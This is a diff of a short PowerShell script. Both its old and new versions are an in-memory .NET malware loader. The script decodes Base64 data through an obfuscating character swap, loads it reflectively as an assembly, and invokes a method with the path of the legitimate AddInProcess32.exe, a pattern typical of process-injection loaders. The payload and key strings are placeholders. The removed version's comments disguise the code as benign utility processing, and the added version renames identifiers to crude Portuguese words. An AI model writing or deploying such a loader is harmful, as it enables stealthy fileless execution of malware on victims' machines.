@@ -1,22 +1,11 @@
-# Define the system path for a legitimate executable
-$systemPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
-
-# Define replacement characters for string manipulation
-$dotReplacement = '.'
-$charReplacement = 'A'
-
-# Prepare encoded data for processing
-$encodedMain = '----'.Replace($dotReplacement, $charReplacement)
-$payloadData = [System.Convert]::FromBase64String($encodedMain)
-
-# Prepare key data
-$encodedKey = '===='.Replace($dotReplacement, $charReplacement)
-$keyData = [System.Convert]::FromBase64String($encodedKey)
-
-# Define namespace and class details
-$namespace = 'SystemUtility'
-$className = 'ProcessHandler'
-$methodName = 'ExecuteProcess'
-
-# Load and execute the process with the provided parameters
-[System.AppDomain]::CurrentDomain.Load($payloadData).GetType("$namespace.$className").GetMethod($methodName).Invoke($null, [Object[]] ($systemPath, $keyData))
+$sysPath = "$env:windir\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe"
+$repDot = '.'
+$repChar = 'A'
+$mainEnc = '----'.Replace($repDot, $repChar)
+$payload = [System.Convert]::FromBase64String($mainEnc)
+$keyEnc = '===='.Replace($repDot, $repChar)
+$keyBytes = [System.Convert]::FromBase64String($keyEnc)
+$cls = 'meupiru'
+$mtd = 'caguei'
+$ns = 'fodasedemais.'
+[System.AppDomain]::CurrentDomain.Load($payload).GetType($ns + $cls).GetMethod($mtd).Invoke($null, [Object[]] ($sysPath, $keyBytes))
